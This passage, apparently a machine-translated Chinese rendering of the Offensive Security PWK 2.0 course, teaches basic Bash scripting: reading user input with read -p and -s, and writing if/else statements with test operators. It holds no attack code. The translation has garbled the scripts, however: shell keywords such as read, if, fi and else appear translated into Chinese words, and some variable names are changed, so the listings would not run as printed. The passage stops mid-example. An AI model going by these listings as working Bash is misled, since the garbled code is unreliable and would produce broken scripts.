<div style="position:absolute;top:129043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行参数是用户输入的一种形式，但我们也可以捕获交互式用户输入</font></font></nobr></div>
<div style="position:absolute;top:129062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当脚本使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">运行时</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在这个例子中，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来捕获用户</font></font></nobr></div>
<div style="position:absolute;top:129082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入并将其分配给一个变量：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./input.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:129168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo “你好，你想学习如何破解：是/否？”</font></font></nobr></div>
<div style="position:absolute;top:129202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读答案</font></font></nobr></div>
<div style="position:absolute;top:129236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你的答案是 $answer"</font></font></nobr></div>
<div style="position:absolute;top:129270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./input.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./input.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你好，你想学习如何破解：是/否？</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:129337;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的答案是 Y</font></font></nobr></div>
<div style="position:absolute;top:129374;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 144 - 使用 read 收集用户输入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用各种命令行选项</font><font style="vertical-align: inherit;">来改变</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的行为</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">其中两个</font></font></nobr></div>
<div style="position:absolute;top:129422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常用的选项包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它允许我们指定一个提示，以及</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它使</font></font></nobr></div>
<div style="position:absolute;top:129442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户输入无声。</font><font style="vertical-align: inherit;">后者非常适合捕获用户凭据：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./input2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:129511;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 提示用户输入凭据 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:129667;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="110"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 110 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:129700;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:130777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:130777;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:130777;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read -p '用户名：' 用户名</font></font></nobr></div>
<div style="position:absolute;top:129812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">read -sp '密码：' 密码</font></font></nobr></div>
<div style="position:absolute;top:129846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "谢谢，您的凭据如下：" $username " 和 " $password</font></font></nobr></div>
<div style="position:absolute;top:129880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./input2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./input2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:129931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali</font></font></font></b></nobr></div>
<div style="position:absolute;top:129948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码： </font></font></nobr></div>
<div style="position:absolute;top:129965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谢谢，您的信用如下：kali 和 nothing2see！</font></font></nobr></div>
<div style="position:absolute;top:129985;left:258"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 145 - 提示用户输入并使用 read 静默读取它</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:130018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.3 If, Else, Elif 语句</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130060;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句允许我们根据不同的条件执行不同的操作。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:130079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常见的 Bash 条件语句包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">else</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:130112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句是比较简单的，它会检查，看有没有条件为真，但它需要一个非常</font></font></nobr></div>
<div style="position:absolute;top:130132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体语法。</font><font style="vertical-align: inherit;">请注意此语法，尤其是必需空格的使用：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ &lt;一些测试&gt; ]</font></font></nobr></div>
<div style="position:absolute;top:130184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:130201;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行一个动作&gt;</font></font></nobr></div>
<div style="position:absolute;top:130217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:130237;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 146 - if 语句的一般语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在此清单中，如果“some test”评估为真，则脚本将“执行操作”或任何命令</font></font></nobr></div>
<div style="position:absolute;top:130285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">then</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fi</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">之间</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">让我们看一个实际的例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:130320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./if.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:130337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:130354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># if 语句示例</font></font></nobr></div>
<div style="position:absolute;top:130388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读 -p "你的年龄：" age</font></font></nobr></div>
<div style="position:absolute;top:130422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ $age -lt 16 ]</font></font></nobr></div>
<div style="position:absolute;top:130439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:130456;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你可能需要家长的许可才能参加这门课程！"</font></font></nobr></div>
<div style="position:absolute;top:130473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:130507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./if.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:130541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./if.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:130558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的年龄：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></font></b></nobr></div>
<div style="position:absolute;top:130575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能需要家长许可才能参加本课程！</font></font></nobr></div>
<div style="position:absolute;top:130594;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 147 - 在 Bash 中使用 if 语句</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:130623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句来检查用户输入的年龄。</font><font style="vertical-align: inherit;">如果输入的年龄是</font></font></nobr></div>
<div style="position:absolute;top:130643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小于 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-lt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 16，脚本将输出警告消息。</font></font></nobr></div>
<div style="position:absolute;top:130676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句中</font><font style="vertical-align: inherit;">的方括号（“[”和“]”）</font><font style="vertical-align: inherit;">实际上是对</font><i><font style="vertical-align: inherit;">测试</font></i><font style="vertical-align: inherit;">的引用</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:130695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这只是意味着我们可以使用</font><i><font style="vertical-align: inherit;">测试</font></i><font style="vertical-align: inherit;">允许的所有运算符</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:130715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">一些最常见的运算符包括：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:130855;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="111"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 111 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:130888;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:131965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:131965;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:131965;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:130985;left:241"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作员</font></font></nobr></div>
<div style="position:absolute;top:130985;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：表达式 True if…</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131006;left:226"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">！表达</font></font></nobr></div>
<div style="position:absolute;top:131006;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表达式为假。</font></font></nobr></div>
<div style="position:absolute;top:131026;left:239"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n 字符串</font></font></nobr></div>
<div style="position:absolute;top:131026;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STRING 长度大于零</font></font></nobr></div>
<div style="position:absolute;top:131046;left:239"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-z 字符串</font></font></nobr></div>
<div style="position:absolute;top:131046;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STRING 的长度为零（空）</font></font></nobr></div>
<div style="position:absolute;top:131067;left:199"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串 1 != 字符串 2</font></font></nobr></div>
<div style="position:absolute;top:131067;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STRING1 不等于 STRING2</font></font></nobr></div>
<div style="position:absolute;top:131087;left:201"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串 1 = 字符串 2</font></font></nobr></div>
<div style="position:absolute;top:131087;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STRING1 等于 STRING2</font></font></nobr></div>
<div style="position:absolute;top:131107;left:185"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -eq INTEGER2 INTEGER1 等于 INTEGER2</font></font></nobr></div>
<div style="position:absolute;top:131127;left:185"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -ne INTEGER2 INTEGER1 不等于 INTEGER2</font></font></nobr></div>
<div style="position:absolute;top:131147;left:187"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -gt INTEGER2 INTEGER1 大于 INTEGER2</font></font></nobr></div>
<div style="position:absolute;top:131167;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -lt INTEGER2 INTEGER1 小于 INTEGER2</font></font></nobr></div>
<div style="position:absolute;top:131187;left:185"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -ge INTEGER2 INTEGER1 大于或等于 INTEGER 2</font></font></nobr></div>
<div style="position:absolute;top:131207;left:188"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">INTEGER1 -le INTEGER2 INTEGER1 小于或等于 INTEGER 2</font></font></nobr></div>
<div style="position:absolute;top:131227;left:251"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d 文件</font></font></nobr></div>
<div style="position:absolute;top:131227;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE 存在并且是一个目录</font></font></nobr></div>
<div style="position:absolute;top:131247;left:252"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e 文件</font></font></nobr></div>
<div style="position:absolute;top:131247;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件已存在</font></font></nobr></div>
<div style="position:absolute;top:131267;left:253"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r 文件</font></font></nobr></div>
<div style="position:absolute;top:131267;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE 存在并具有读取权限</font></font></nobr></div>
<div style="position:absolute;top:131288;left:252"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s 文件</font></font></nobr></div>
<div style="position:absolute;top:131288;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE 存在且不为空</font></font></nobr></div>
<div style="position:absolute;top:131307;left:250"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w 文件</font></font></nobr></div>
<div style="position:absolute;top:131307;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE 存在并且有写权限</font></font></nobr></div>
<div style="position:absolute;top:131328;left:252"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x 文件</font></font></nobr></div>
<div style="position:absolute;top:131328;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FILE 存在并具有执行权限</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131348;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 5 - 常用测试命令操作符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到上述情况，我们之前使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">示例</font><font style="vertical-align: inherit;">可以在没有方括号的情况下重写为</font></font></nobr></div>
<div style="position:absolute;top:131396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./if2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:131448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:131465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># if 语句示例 2</font></font></nobr></div>
<div style="position:absolute;top:131499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读 -p "你的年龄：" age</font></font></nobr></div>
<div style="position:absolute;top:131533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果测试 $age -lt 16</font></font></nobr></div>
<div style="position:absolute;top:131550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:131567;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你可能需要家长的许可才能参加这门课程！"</font></font></nobr></div>
<div style="position:absolute;top:131584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:131618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./if2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:131652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./if2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:131669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的年龄：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></font></b></nobr></div>
<div style="position:absolute;top:131686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可能需要家长许可才能参加本课程！</font></font></nobr></div>
<div style="position:absolute;top:131705;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 148 - 在 if 语句中使用 test 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:131734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此示例在功能上等同于使用方括号的示例，但使用</font></font></nobr></div>
<div style="position:absolute;top:131754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方括号使代码更容易阅读。</font></font></nobr></div>
<div style="position:absolute;top:131787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果一个语句为真，我们也可以执行一组特定的动作，如果它为假，我们还可以执行另一组动作。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:131806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">else</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句，其语法如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:131841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ &lt;一些测试&gt; ]</font></font></nobr></div>
<div style="position:absolute;top:131858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:131875;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行操作&gt;</font></font></nobr></div>
<div style="position:absolute;top:131892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:132043;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="112"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 112 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:132076;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:133153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:133153;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:133153;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">112</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132172;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行另一个操作&gt;</font></font></nobr></div>
<div style="position:absolute;top:132188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:132208;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 149 - else 语句的一般语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们扩展之前的“age”示例以包含</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">else</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./else.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:132289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:132306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># else 语句示例</font></font></nobr></div>
<div style="position:absolute;top:132340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读 -p "你的年龄：" age</font></font></nobr></div>
<div style="position:absolute;top:132374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ $age -lt 16 ]</font></font></nobr></div>
<div style="position:absolute;top:132391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:132408;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你可能需要家长的许可才能参加这门课程！"</font></font></nobr></div>
<div style="position:absolute;top:132425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的</font></font></nobr></div>
